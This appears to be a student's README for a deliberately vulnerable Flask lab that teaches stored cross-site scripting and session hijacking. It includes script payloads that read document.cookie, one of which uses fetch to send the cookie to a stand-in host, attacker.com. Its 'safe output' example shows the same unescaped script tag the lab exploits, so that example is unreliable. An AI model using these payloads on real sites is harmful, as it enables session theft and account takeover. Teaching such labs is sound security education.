# XSS Session Hijacking Lab

This project is a simple vulnerable web application built using Python Flask to demonstrate how Cross-Site Scripting (XSS) vulnerabilities can lead to Session Hijacking.

The purpose of this lab is to help understand how attackers exploit unsanitized user input to execute malicious JavaScript inside a victim's browser and steal session cookies.

This project is strictly for educational and learning purposes in cybersecurity and web application security.

---

# Overview

Cross-Site Scripting (XSS) is one of the most common vulnerabilities found in web applications. It occurs when an application includes untrusted data in a web page without proper validation or escaping.

Attackers can inject malicious scripts that run in the victim's browser. These scripts can steal session cookies, redirect users to malicious websites, or perform actions on behalf of the victim.

In this lab we simulate:

- A vulnerable comment feature
- Injection of malicious JavaScript
- Accessing browser cookies
- Understanding how session hijacking works

---

# Project Structure

web-lab/

app.py

templates/

- login.html
- dashboard.html
- comment.html

venv/

# README.md

Explanation:

app.py
Main Flask application that handles login, sessions, and comments.

templates/
Contains all HTML pages used by the application.

login.html
Login page for the application.

dashboard.html
Page shown after successful login.

comment.html
Page where users can post comments. This page is intentionally vulnerable to XSS.

venv/
Python virtual environment.

README.md
Documentation for the project.

---

Requirements

Make sure you have the following installed:

- Python 3
- pip
- Git

---

Installation

Clone the repository

git clone https://github.com/YOUR_USERNAME/xss-session-hijacking-lab.git

cd xss-session-hijacking-lab

Create a virtual environment

python3 -m venv venv

Activate the virtual environment

Linux / WSL

source venv/bin/activate

Windows

venv\Scripts\activate

Install Flask

pip install flask

---

Running the Lab

Run the Flask application

python app.py

Then open your browser and go to

http://127.0.0.1:5000

---

Login

Use the demo credentials

username: admin
password: admin

After logging in successfully you will be redirected to the dashboard page.

---

# Step 1 : Posting a Normal Comment

Navigate to the comment page and submit a normal comment such as

Hello this is my first comment

The comment will be displayed on the page.

---

# Step 2 : Testing XSS

Now try injecting JavaScript

<script>alert("XSS works")</script>If a popup appears in the browser, the page is vulnerable to Cross-Site Scripting.

---

# Step 3 : Accessing Cookies

Now try accessing the session cookie using JavaScript

<script>
alert(document.cookie)
</script>The browser will display something like

session=abc123xyz

This value represents the user's session cookie.

---

# Why This Is Dangerous

Web applications often use session cookies to identify logged-in users.

When a user logs in:

1. The user sends username and password to the server
2. The server generates a session ID
3. The browser stores that session ID as a cookie

For every request afterward, the browser sends the cookie back to the server.

If an attacker steals this cookie, they can impersonate the victim without knowing the password.

This is called Session Hijacking.

---

# Example of Cookie Stealing

Attackers can send the stolen cookie to their own server using JavaScript

<script>
fetch("http://attacker.com/steal?cookie=" + document.cookie)
</script>The victim's browser will send their cookie to the attacker.

---

# How Developers Prevent XSS

Developers can protect applications by:

- Sanitizing user input
- Escaping HTML output
- Implementing Content Security Policy (CSP)
- Using HTTPOnly cookies
- Validating all user input

Example of safe output

<script>alert("XSS")</script>

---

# Educational Purpose

This project is created for cybersecurity learning purposes.

Do not use these techniques on real systems without explicit permission.

Unauthorized exploitation of vulnerabilities is illegal.

---

# Author

Aditya Daffa Putra Pristianto
Computer Engineering Student at Universitas Diponegoro
Learning Red Team and Web Security
